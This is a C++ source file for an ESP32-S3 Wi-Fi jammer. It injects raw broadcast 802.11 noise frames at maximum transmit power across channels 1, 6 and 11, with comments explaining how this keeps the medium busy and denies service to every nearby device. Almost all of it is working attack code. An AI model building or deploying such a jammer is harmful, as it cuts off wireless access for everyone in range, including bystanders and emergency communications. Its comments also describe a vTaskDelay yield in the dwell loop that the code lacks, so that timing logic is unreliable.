/**
 * wifi_jammer.cpp
 *
 * Core jamming logic. Handles Wi-Fi radio initialisation for raw frame
 * injection and implements the sweep task that cycles across target channels.
 *
 * The attack exploits CSMA/CA — the MAC-layer protocol every 802.11 device
 * uses before transmitting. CSMA/CA requires a device to sense the medium
 * first; if busy, it waits. By continuously injecting frames, we keep the
 * medium permanently "busy", preventing any legitimate device from
 * getting a transmission window.
 */

#include <Arduino.h>
#include "wifi_jammer.h"
#include "config.h"
#include "state.h"
#include "nvs_flash.h"
#include "esp_wifi.h"

/**
 * Raw 802.11 data frame used as noise.
 *
 * All three MAC address fields (destination, source, BSSID) are set to
 * broadcast (FF:FF:FF:FF:FF:FF). This is deliberate — a broadcast-addressed
 * frame is processed by every device on the channel, maximising the number
 * of devices forced into a CSMA/CA wait state per injected frame.
 *
 * The payload (0xDEADBEEF pattern) is arbitrary garbage. We are not trying
 * to communicate — we are generating RF occupancy. The frame just needs to
 * be long enough to hold the channel for a meaningful duration per injection.
 *
 * Frame structure follows IEEE 802.11 — Frame Control, Duration, three MAC
 * address fields, Sequence Control, then payload.
 */
static uint8_t noise_frame[] = {
    0x08, 0x00,                          // Frame Control — type: data frame
    0x00, 0x00,                          // Duration — zero, we don't reserve the medium politely
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination MAC — broadcast
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Source MAC — broadcast
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // BSSID — broadcast
    0x00, 0x00,                          // Sequence Control
    0xDE, 0xAD, 0xBE, 0xEF,              // Payload — garbage
    0xDE, 0xAD, 0xBE, 0xEF,
    0xDE, 0xAD, 0xBE, 0xEF
};

// The three non-overlapping 2.4 GHz channels. Targeting only these three
// is sufficient to disrupt the entire 2.4 GHz band — all other channels
// overlap with at least one of these, so adjacent-channel interference
// handles the rest.
static uint8_t channels[CHANNEL_COUNT] = {1, 6, 11};

/**
 * Initialises the ESP32 Wi-Fi stack in station mode without connecting
 * to any AP. We only need the radio hardware active for raw frame injection —
 * no association, no IP, no credentials required.
 *
 * NVS (Non-Volatile Storage) must be initialised first — the Wi-Fi driver
 * uses it internally to store calibration data. Without this the driver
 * will fail to start.
 *
 * TX power is set to maximum (+21 dBm) to extend effective jamming range
 * as far as the ESP32-S3 hardware allows without external amplification.
 */
void wifi_init() {
    esp_err_t ret = nvs_flash_init();

    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        // NVS partition is full or outdated — wipe and reinitialise
        nvs_flash_erase();
        nvs_flash_init();
    }

    esp_netif_init();
    esp_event_loop_create_default();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();

    // 84 in ESP-IDF units = +21 dBm (each unit is 0.25 dBm)
    // This is the legal maximum output power for the ESP32-S3
    esp_wifi_set_max_tx_power(84);

    // Promiscuous mode required for raw frame injection to work
    esp_wifi_set_promiscuous(true);

    Serial.println("[*] Wi-Fi ready");
}

/**
 * Tunes the radio to the specified channel and injects BURST_SIZE frames
 * back-to-back with no delay between them.
 *
 * esp_wifi_80211_tx() bypasses the normal Wi-Fi stack entirely and writes
 * raw 802.11 frames directly to the radio hardware. The third argument
 * (false) tells the driver not to manage sequence numbers — we don't care
 * about frame ordering, we just want volume.
 *
 * The result is continuous RF transmission on the target channel for the
 * duration of the burst, collapsing SNR for every nearby receiver and
 * holding the medium busy against all CSMA/CA checks.
 */
void jam_channel(uint8_t ch) {
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

    Serial.print("[*] Jamming channel ");
    Serial.println(ch);

    for (int i = 0; i < BURST_SIZE; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, noise_frame, sizeof(noise_frame), false);
    }
}

/**
 * FreeRTOS task — runs indefinitely on core 1.
 *
 * Sweeps across channels 1, 6, 11 in sequence. On each channel it calls
 * jam_channel() repeatedly for DWELL_MS milliseconds before moving on.
 * The short vTaskDelay(10) inside the dwell loop yields to the FreeRTOS
 * watchdog timer — without any yield the watchdog will reset the ESP32
 * assuming the task has hung.
 *
 * When jamming is false the task idles, allowing clean start/stop control
 * via the hardware buttons without killing and restarting the task itself.
 */
void sweep_task(void* params) {
    int idx = 0;

    while (true) {
        if (jamming == true) {
            uint8_t ch       = channels[idx];
            uint32_t elapsed = 0;

            while (elapsed < DWELL_MS) {
                jam_channel(ch);
                elapsed += 10;
            }

            idx = idx + 1;

            if (idx >= CHANNEL_COUNT) {
                idx = 0;
            }
        } else {
            vTaskDelay(100 / portTICK_PERIOD_MS);
        }
    }
}